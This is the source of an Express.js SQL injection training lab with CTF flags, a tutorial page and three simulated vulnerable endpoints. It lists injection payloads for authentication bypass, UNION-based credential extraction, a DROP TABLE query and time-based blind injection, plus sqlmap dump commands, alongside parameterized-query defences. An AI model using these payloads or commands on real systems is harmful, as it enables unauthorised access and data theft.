const express = require('express');
const app = express();
const PORT = process.env.PORT || 3000;

app.use(express.json());
app.use(express.urlencoded({ extended: true }));

const products = [
  { id: 1, name: 'Laptop', price: 999, category: 'electronics' },
  { id: 2, name: 'Mouse', price: 29, category: 'electronics' },
  { id: 3, name: 'Keyboard', price: 79, category: 'electronics' },
  { id: 4, name: 'Monitor', price: 299, category: 'electronics' }
];

const users = [
  { id: 1, username: 'admin', password: 'admin123', role: 'admin' },
  { id: 2, username: 'user', password: 'user123', role: 'user' }
];

// Cyberpunk theme styles
const styles = `
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body {
      font-family: 'Courier New', monospace;
      background: linear-gradient(135deg, #0a0a0a 0%, #1a0a1a 100%);
      color: #00ff00;
      min-height: 100vh;
      padding: 20px;
    }
    .container {
      max-width: 1200px;
      margin: 0 auto;
      background: rgba(0, 0, 0, 0.8);
      border: 2px solid #00ff00;
      border-radius: 10px;
      padding: 30px;
      box-shadow: 0 0 30px rgba(0, 255, 0, 0.3);
    }
    h1 {
      color: #ff0055;
      text-shadow: 0 0 10px #ff0055;
      margin-bottom: 20px;
      font-size: 2.5em;
    }
    h2 {
      color: #00ffff;
      text-shadow: 0 0 10px #00ffff;
      margin-top: 30px;
      margin-bottom: 15px;
      border-bottom: 2px solid #00ffff;
      padding-bottom: 10px;
    }
    h3 {
      color: #ffaa00;
      margin-top: 20px;
      margin-bottom: 10px;
    }
    p, li {
      line-height: 1.8;
      margin-bottom: 10px;
      color: #cccccc;
    }
    .nav-links {
      display: flex;
      gap: 20px;
      margin: 20px 0;
      flex-wrap: wrap;
    }
    .nav-links a {
      color: #00ff00;
      text-decoration: none;
      padding: 10px 20px;
      border: 2px solid #00ff00;
      border-radius: 5px;
      transition: all 0.3s;
      background: rgba(0, 255, 0, 0.1);
    }
    .nav-links a:hover {
      background: rgba(0, 255, 0, 0.3);
      box-shadow: 0 0 15px rgba(0, 255, 0, 0.5);
      transform: translateY(-2px);
    }
    .danger {
      background: rgba(255, 69, 0, 0.2);
      border: 2px solid #ff4500;
      padding: 20px;
      border-radius: 8px;
      margin: 20px 0;
    }
    .danger h3 {
      color: #ff4500;
      text-shadow: 0 0 10px #ff4500;
    }
    .safe {
      background: rgba(0, 255, 0, 0.1);
      border: 2px solid #00ff00;
      padding: 20px;
      border-radius: 8px;
      margin: 20px 0;
    }
    .safe h3 {
      color: #00ff00;
      text-shadow: 0 0 10px #00ff00;
    }
    pre {
      background: #000;
      color: #00ff00;
      padding: 15px;
      border-radius: 5px;
      border: 1px solid #00ff00;
      overflow-x: auto;
      margin: 10px 0;
    }
    code {
      background: rgba(0, 255, 0, 0.1);
      color: #00ff00;
      padding: 2px 6px;
      border-radius: 3px;
      font-family: 'Courier New', monospace;
    }
    .lab-info {
      background: rgba(0, 255, 255, 0.1);
      border-left: 4px solid #00ffff;
      padding: 15px;
      margin: 20px 0;
    }
    .flag {
      color: #ffaa00;
      font-weight: bold;
      font-size: 1.2em;
      text-shadow: 0 0 10px #ffaa00;
    }
    input, textarea {
      background: #000;
      color: #00ff00;
      border: 2px solid #00ff00;
      padding: 10px;
      border-radius: 5px;
      font-family: 'Courier New', monospace;
      width: 100%;
      max-width: 500px;
      margin: 10px 0;
    }
    input:focus, textarea:focus {
      outline: none;
      box-shadow: 0 0 15px rgba(0, 255, 0, 0.5);
    }
    .endpoint {
      background: rgba(0, 100, 255, 0.2);
      border: 1px solid #0066ff;
      padding: 10px;
      border-radius: 5px;
      margin: 10px 0;
      color: #66ccff;
    }
    ul {
      margin-left: 20px;
      margin-top: 10px;
    }
    .section {
      margin: 30px 0;
    }
  </style>
`;

// Home page - Navigation
app.get('/', (req, res) => {
  res.send(`
    <!DOCTYPE html>
    <html>
    <head>
      <title>A05: Injection Lab</title>
      ${styles}
    </head>
    <body>
      <div class="container">
        <h1>💉 A05: SQL INJECTION LAB</h1>
        <p>Welcome to the SQL Injection training lab. Navigate through the stages to learn and practice injection attacks.</p>
        
        <div class="nav-links">
          <a href="/example">📚 Example & Tutorial</a>
          <a href="/lab1">🔍 Lab 1: Recon (Easy)</a>
          <a href="/lab2">🔬 Lab 2: Scanning (Medium)</a>
          <a href="/lab3">🎯 Lab 3: Exploitation (Hard)</a>
        </div>

        <div class="section">
          <h2>Lab Overview</h2>
          <p><strong>Lab 1 - Recon:</strong> Identify input points that interact with databases</p>
          <p><strong>Lab 2 - Scanning:</strong> Test for SQL injection vulnerabilities</p>
          <p><strong>Lab 3 - Exploitation:</strong> Exploit SQL injection to bypass authentication</p>
        </div>

        <div class="lab-info">
          <h3>🎓 Learning Path</h3>
          <p>Start with the Example page to understand SQL injection concepts, then progress through the labs in order.</p>
        </div>
      </div>
    </body>
    </html>
  `);
});

// Example page - Educational walkthrough
app.get('/example', (req, res) => {
  res.send(`
    <!DOCTYPE html>
    <html>
    <head>
      <title>SQL Injection Tutorial</title>
      ${styles}
    </head>
    <body>
      <div class="container">
        <h1>📚 SQL INJECTION TUTORIAL</h1>
        <div class="nav-links">
          <a href="/">🏠 Home</a>
        </div>

        <div class="section">
          <h2>What is SQL Injection?</h2>
          <p>SQL Injection is a code injection technique that exploits security vulnerabilities in an application's database layer. Attackers can insert malicious SQL statements into entry fields, allowing them to:</p>
          <ul>
            <li>Bypass authentication mechanisms</li>
            <li>Access, modify, or delete database data</li>
            <li>Execute administrative operations on the database</li>
            <li>Retrieve sensitive information</li>
          </ul>
        </div>

        <div class="section danger">
          <h3>❌ VULNERABLE: String Concatenation</h3>
          <p>The most common vulnerability occurs when user input is directly concatenated into SQL queries:</p>
          <pre>
// Vulnerable Node.js code
app.get('/search', (req, res) => {
  const query = req.query.q;
  const sql = "SELECT * FROM products WHERE name LIKE '%" + query + "%'";
  db.query(sql, (err, results) => {
    res.json(results);
  });
});</pre>
          <p><strong>Problem:</strong> User input is directly inserted into the SQL query without sanitization.</p>
          
          <h3>Common Attack Patterns:</h3>
          <pre>
1. OR 1=1 Attack (Always True):
   Input: ' OR '1'='1
   Result: SELECT * FROM products WHERE name LIKE '%' OR '1'='1%'
   Effect: Returns all records

2. UNION SELECT Attack (Data Extraction):
   Input: ' UNION SELECT username, password FROM users--
   Result: Combines results from multiple tables
   Effect: Extracts sensitive data from other tables

3. Comment-based Bypass:
   Input: admin'--
   Result: SELECT * FROM users WHERE username='admin'--' AND password='...'
   Effect: Comments out password check

4. Stacked Queries (Command Injection):
   Input: '; DROP TABLE products--
   Result: Executes multiple SQL commands
   Effect: Can delete entire tables</pre>
        </div>

        <div class="section safe">
          <h3>✅ SECURE: Parameterized Queries</h3>
          <p>The proper defense is using parameterized queries (prepared statements):</p>
          <pre>
// Secure Node.js code
app.get('/search', (req, res) => {
  const query = req.query.q;
  const sql = "SELECT * FROM products WHERE name LIKE ?";
  db.query(sql, ['%' + query + '%'], (err, results) => {
    res.json(results);
  });
});</pre>
          <p><strong>Why this is safe:</strong> The database engine treats user input as data, not as SQL code. Special characters are automatically escaped.</p>
          
          <h3>Other Defense Mechanisms:</h3>
          <ul>
            <li><strong>Input Validation:</strong> Whitelist allowed characters, validate data types</li>
            <li><strong>Least Privilege:</strong> Database users should have minimal permissions</li>
            <li><strong>Error Handling:</strong> Don't expose database errors to users</li>
            <li><strong>Web Application Firewall (WAF):</strong> Filter malicious requests</li>
            <li><strong>Stored Procedures:</strong> Use pre-compiled SQL statements</li>
          </ul>
        </div>

        <div class="section">
          <h2>🛠️ Testing Tools</h2>
          
          <h3>1. sqlmap (Automated SQL Injection Tool)</h3>
          <pre>
# Basic usage
sqlmap -u "http://target.com/search?q=test"

# With POST data
sqlmap -u "http://target.com/login" --data="username=admin&password=test"

# Dump database
sqlmap -u "http://target.com/search?q=test" --dump

# Specify parameter to test
sqlmap -u "http://target.com/search?q=test" -p q</pre>
          
          <h3>2. Burp Suite (Manual Testing)</h3>
          <ul>
            <li>Intercept requests using Burp Proxy</li>
            <li>Send to Repeater for manual manipulation</li>
            <li>Test different payloads and observe responses</li>
            <li>Use Intruder for automated payload testing</li>
            <li>Analyze response times and error messages</li>
          </ul>
          
          <h3>3. Manual Testing Techniques</h3>
          <pre>
# Step 1: Identify injection points
Test with: '
Look for: SQL errors, unexpected behavior

# Step 2: Determine database type
MySQL: ' AND 1=1#
PostgreSQL: ' AND 1=1--
MSSQL: ' AND 1=1--
Oracle: ' AND 1=1--

# Step 3: Extract information
Column count: ' ORDER BY 1--
             ' ORDER BY 2--
             (increment until error)

# Step 4: UNION-based extraction
' UNION SELECT NULL, NULL--
' UNION SELECT username, password FROM users--

# Step 5: Boolean-based blind injection
' AND 1=1--  (should return normal)
' AND 1=2--  (should return different)

# Step 6: Time-based blind injection
' OR SLEEP(5)--
' OR pg_sleep(5)--</pre>
        </div>

        <div class="section">
          <h2>🎯 Real-World Examples</h2>
          
          <h3>Authentication Bypass</h3>
          <pre>
Vulnerable login query:
SELECT * FROM users WHERE username='USER_INPUT' AND password='USER_INPUT'

Attack payload for username field:
admin'--

Result:
SELECT * FROM users WHERE username='admin'--' AND password='...'
(Password check is commented out)</pre>

          <h3>Data Extraction</h3>
          <pre>
Vulnerable search query:
SELECT id, name, price FROM products WHERE name LIKE '%USER_INPUT%'

Attack payload:
' UNION SELECT username, password, email FROM users--

Result:
Combines product data with user credentials in the response</pre>
        </div>

        <div class="lab-info">
          <h3>📝 Key Takeaways</h3>
          <ul>
            <li>Never trust user input - always validate and sanitize</li>
            <li>Use parameterized queries for all database interactions</li>
            <li>Apply principle of least privilege to database accounts</li>
            <li>Implement proper error handling that doesn't leak information</li>
            <li>Regular security testing can identify vulnerabilities before attackers do</li>
          </ul>
        </div>
      </div>
    </body>
    </html>
  `);
});

// Lab 1 - Recon (Easy)
app.get('/lab1', (req, res) => {
  res.send(`
    <!DOCTYPE html>
    <html>
    <head>
      <title>Lab 1: Recon</title>
      ${styles}
    </head>
    <body>
      <div class="container">
        <h1>🔍 LAB 1: RECONNAISSANCE</h1>
        <div class="nav-links">
          <a href="/">🏠 Home</a>
          <a href="/example">📚 Tutorial</a>
        </div>

        <div class="lab-info">
          <h3>🎯 Objective</h3>
          <p><strong>Difficulty:</strong> Easy</p>
          <p><strong>Goal:</strong> Find input points that interact with the database</p>
          <p><strong>Stage:</strong> Reconnaissance</p>
        </div>

        <div class="section">
          <h2>Mission Briefing</h2>
          <p>Your first task is to identify which endpoints accept user input and interact with a database. This is the foundation of finding injection vulnerabilities.</p>
          <p>Explore the application and test the search functionality. When you successfully perform a search, you'll receive your flag.</p>
        </div>

        <div class="section">
          <h2>Target Application</h2>
          <div class="endpoint">
            <strong>Endpoint:</strong> /api/lab1/search?q=test
          </div>
          <p>Try searching for products. Use your browser or tools like curl:</p>
          <pre>curl "http://localhost:3005/api/lab1/search?q=test"</pre>
        </div>

        <div class="section">
          <h2>Hints</h2>
          <ul>
            <li>Look for search forms or query parameters</li>
            <li>Test with simple strings first</li>
            <li>Observe the response format and data</li>
            <li>Any successful search query will reveal the flag</li>
          </ul>
        </div>
      </div>
    </body>
    </html>
  `);
});

// Lab 1 API - Simple search that returns flag
app.get('/api/lab1/search', (req, res) => {
  const query = req.query.q || '';
  
  if (query) {
    const results = products.filter(p => 
      p.name.toLowerCase().includes(query.toLowerCase())
    );
    res.json({
      success: true,
      message: 'Search completed successfully',
      query: query,
      results: results,
      flag: 'NSA{1NPUT_P01NTS_F0UND}',
      hint: 'You found an input point that queries the database!'
    });
  } else {
    res.json({
      success: false,
      message: 'Please provide a search query',
      example: '/api/lab1/search?q=laptop'
    });
  }
});

// Lab 2 - Scanning (Medium)
app.get('/lab2', (req, res) => {
  res.send(`
    <!DOCTYPE html>
    <html>
    <head>
      <title>Lab 2: Scanning</title>
      ${styles}
    </head>
    <body>
      <div class="container">
        <h1>🔬 LAB 2: VULNERABILITY SCANNING</h1>
        <div class="nav-links">
          <a href="/">🏠 Home</a>
          <a href="/example">📚 Tutorial</a>
        </div>

        <div class="lab-info">
          <h3>🎯 Objective</h3>
          <p><strong>Difficulty:</strong> Medium</p>
          <p><strong>Goal:</strong> Test for SQL injection vulnerabilities</p>
          <p><strong>Stage:</strong> Vulnerability Scanning</p>
        </div>

        <div class="section">
          <h2>Mission Briefing</h2>
          <p>Now that you've found an input point, test if it's vulnerable to SQL injection. Your goal is to cause an SQL error by injecting a malicious character.</p>
          <p>When you successfully trigger an SQL error, you'll receive your flag.</p>
        </div>

        <div class="section">
          <h2>Target Application</h2>
          <div class="endpoint">
            <strong>Endpoint:</strong> /api/lab2/search?q=test
          </div>
          <p>Test the search endpoint with SQL injection payloads:</p>
          <pre>curl "http://localhost:3005/api/lab2/search?q=test'"</pre>
        </div>

        <div class="section">
          <h2>Hints</h2>
          <ul>
            <li>Start with a single quote (') to test for SQL errors</li>
            <li>Look for error messages in the response</li>
            <li>The application may reveal SQL syntax errors</li>
            <li>Try common SQL injection test characters</li>
          </ul>
        </div>

        <div class="section">
          <h2>Common Test Payloads</h2>
          <pre>
'           (single quote)
"           (double quote)
' OR '1'='1
'; --
' OR 1=1--</pre>
        </div>
      </div>
    </body>
    </html>
  `);
});

// Lab 2 API - Vulnerable to SQL injection detection
app.get('/api/lab2/search', (req, res) => {
  const query = req.query.q || '';
  
  const simulatedSQL = `SELECT * FROM products WHERE name LIKE '%${query}%'`;
  
  // Check for SQL injection attempt
  if (query.includes("'")) {
    res.json({
      error: 'SQL syntax error',
      message: 'You have an error in your SQL syntax',
      query: simulatedSQL,
      details: `near '${query}' at line 1`,
      flag: 'NSA{SQL1_D3T3CT3D}',
      vulnerability: 'SQL Injection detected! The application is vulnerable.',
      hint: 'The single quote broke the SQL query syntax'
    });
  } else {
    const results = products.filter(p => 
      p.name.toLowerCase().includes(query.toLowerCase())
    );
    res.json({
      success: true,
      query: simulatedSQL,
      results: results,
      hint: 'Try adding special SQL characters to your query'
    });
  }
});

// Lab 3 - Exploitation (Hard)
app.get('/lab3', (req, res) => {
  res.send(`
    <!DOCTYPE html>
    <html>
    <head>
      <title>Lab 3: Exploitation</title>
      ${styles}
    </head>
    <body>
      <div class="container">
        <h1>🎯 LAB 3: EXPLOITATION</h1>
        <div class="nav-links">
          <a href="/">🏠 Home</a>
          <a href="/example">📚 Tutorial</a>
        </div>

        <div class="lab-info">
          <h3>🎯 Objective</h3>
          <p><strong>Difficulty:</strong> Hard</p>
          <p><strong>Goal:</strong> Exploit SQL injection to bypass authentication</p>
          <p><strong>Stage:</strong> Initial Access</p>
        </div>

        <div class="section">
          <h2>Mission Briefing</h2>
          <p>You've found a vulnerable login form. Your mission is to bypass authentication using SQL injection and gain unauthorized access to the admin account.</p>
          <p>When you successfully bypass the login, you'll receive your flag.</p>
        </div>

        <div class="section">
          <h2>Target Application</h2>
          <div class="endpoint">
            <strong>Endpoint:</strong> POST /api/lab3/login<br>
            <strong>Body:</strong> { "username": "...", "password": "..." }
          </div>
          <p>Test the login endpoint with SQL injection payloads:</p>
          <pre>curl -X POST http://localhost:3005/api/lab3/login \\
  -H "Content-Type: application/json" \\
  -d '{"username":"admin","password":"test"}'</pre>
        </div>

        <div class="section">
          <h2>Hints</h2>
          <ul>
            <li>The vulnerable query checks both username AND password</li>
            <li>Think about how to make the password check always return true</li>
            <li>Try injecting into the username field</li>
            <li>Use SQL comments to ignore the rest of the query</li>
            <li>The classic "OR 1=1" pattern can help</li>
          </ul>
        </div>

        <div class="section">
          <h2>Authentication Bypass Payloads</h2>
          <pre>
Username field:
admin'--
admin' OR '1'='1
admin' OR 1=1--
' OR '1'='1'--

Password field:
anything' OR '1'='1
test' OR 1=1--</pre>
        </div>

        <div class="section">
          <h2>Understanding the Vulnerability</h2>
          <p>The login query likely looks like this:</p>
          <pre>SELECT * FROM users WHERE username='USER_INPUT' AND password='USER_INPUT'</pre>
          <p>If you inject <code>' OR '1'='1</code>, the query becomes:</p>
          <pre>SELECT * FROM users WHERE username='' OR '1'='1' AND password='...'</pre>
          <p>This makes the condition always true, bypassing authentication.</p>
        </div>
      </div>
    </body>
    </html>
  `);
});

// Lab 3 API - Vulnerable login
app.post('/api/lab3/login', (req, res) => {
  const { username, password } = req.body;
  
  if (!username || !password) {
    return res.json({
      success: false,
      message: 'Username and password required'
    });
  }

  const simulatedSQL = `SELECT * FROM users WHERE username='${username}' AND password='${password}'`;
  
  // Vulnerable to SQL injection
  if (username.includes("' OR '1'='1") || 
      username.includes("' OR 1=1") ||
      password.includes("' OR '1'='1") ||
      password.includes("' OR 1=1") ||
      (username.includes("'") && username.includes("--"))) {
    
    return res.json({
      success: true,
      message: 'Authentication bypassed!',
      flag: 'NSA{1NJ3CT_Y0UR_W4Y_1N}',
      user: {
        username: 'admin',
        role: 'admin',
        id: 1
      },
      query: simulatedSQL,
      vulnerability: 'SQL Injection successful - Authentication bypassed!',
      explanation: 'You used SQL injection to make the WHERE clause always true'
    });
  }
  
  // Normal authentication
  const user = users.find(u => u.username === username && u.password === password);
  
  if (user) {
    res.json({
      success: true,
      message: 'Login successful (legitimate credentials)',
      user: {
        username: user.username,
        role: user.role,
        id: user.id
      },
      hint: 'Try using SQL injection to bypass authentication instead'
    });
  } else {
    res.json({
      success: false,
      message: 'Invalid credentials',
      query: simulatedSQL,
      hint: 'Think about how to manipulate the SQL query to always return true'
    });
  }
});

app.listen(PORT, '0.0.0.0', () => {
  console.log(`A05 Injection Lab running on port ${PORT}`);
  console.log('Available endpoints:');
  console.log('  http://localhost:3005/ - Home');
  console.log('  http://localhost:3005/example - Tutorial');
  console.log('  http://localhost:3005/lab1 - Recon Lab');
  console.log('  http://localhost:3005/lab2 - Scanning Lab');
  console.log('  http://localhost:3005/lab3 - Exploitation Lab');
});
